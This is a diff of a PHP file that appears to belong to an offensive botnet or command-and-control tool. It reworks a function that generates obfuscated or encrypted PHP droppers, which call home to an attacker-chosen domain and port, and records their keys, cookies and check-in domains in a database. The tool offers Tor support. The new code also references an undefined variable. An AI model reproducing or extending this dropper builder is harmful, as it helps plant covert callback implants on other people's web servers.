@@ -29,7 +29,6 @@ $cof = array(
         "use_proxies"=>null,
         "rotate"=>null,
         "use_tor"=>true
-
     )
 );
 const response_array = array(
@@ -590,59 +589,22 @@ function clo($host, $repo, $uri)
 
 }
 
-function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
+function createDropper($callHome)
 {
     echo "Starting dropper creation\n";
-    $file_in = "includes/base.php";
-    $slop = getcwd() . "/slop.php";
     $t = new dynamic_generator();
     $inDB = new postgres_checker();
-    if (!empty($callHome) && !empty($duration) && !empty($depth) && !empty($obfsucate)) {
+    if (!empty($callHome)) {
         try {
-            switch ($obfsucate) {
-                case "y":
-                    $ob = "includes/droppers/dynamic/obfuscated/" . bin2hex(random_bytes(rand(5, 25))) . ".php";
-                    if ((int)$depth > 23) {
-                        print("Depth needs to be 23 or lower, too much depth causes the script obfuscation to be redundant.\n Since you want a higher depth, going to encrypt the payload/shell.\n");
-                        $encrypt = true;
-                        $depth = 23;
-                    } else {
-                        print("Trying randomness with {$depth}\n");
-                        $encrypt = false;
-                    }
-                    print("Generated dropper will be: {$ob}\n");
-                    $rtValues = $t->begin_junk($file_in, $depth, $ob, "ob", $encrypt, $callHome, $callhomePort, $duration, $slop);
-                    pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, depth, obfuscated, check_in, aeskeys, chachakey, xorkey, checkindomain, checkinport, cookiename, cookievalue) VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')",
-                        $rtValues['Output File'],
-                        $depth,
-                        $obfsucate,
-                        $duration,
-                        $rtValues['Key'] . "." . $rtValues['IV'] . "." . $rtValues['tag'],
-                        '',
-                        $rtValues['XOR Key'],
-                        $rtValues['CheckinDomain'],
-                        $rtValues['CheckinPort'],
-                        $rtValues['Cookie'],
-                        $rtValues['Cookie Value']));
-                    $inDB->countUsedDomains($callHome);
-                    system("ls -lah includes/droppers/dynamic/obfuscated");
-                    print("\n\nPress M to return to the menu.\n");
-                    break;
-                case "n":
-                    menu();
-                    $n = "includes/droppers/dynamic/raw/" . bin2hex(random_bytes(rand(5, 25))) . ".php";
-                    print("Generated Dropper will be: {$n}\n");
-                    $rtValues = $t->begin_junk($file_in, 0, $n, "n", false, $callHome, $callhomePort, 1000, $slop);
-                    system("ls -lah includes/droppers/dynamic/raw");
-                    break;
-            }
+            print("Generated dropper will be: {$ob}\n");
+            $rtValues = $t->slim_dropper($callHome, '', true);
+            $inDB->countUsedDomains($callHome);
+            system("ls -lah includes/droppers/dynamic/slim");
+            print("\n\nPress M to return to the menu.\n");
 
         } catch (Exception $exception) {
             $empty = array(
                 "Callhome" => $callHome,
-                "Duration" => $duration,
-                "Obfuscate" => $obfsucate,
-                "Depth" => $depth,
                 "Actual Exception" => $exception
             );
             logo('cr', clears, true, $empty, '');
@@ -651,9 +613,6 @@ function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
     } else {
         $empty = array(
             "Callhome" => $callHome,
-            "Duration" => $duration,
-            "Obfuscate" => $obfsucate,
-            "Depth" => $depth
         );
         logo('cr', clears, true, $empty, '');
     }
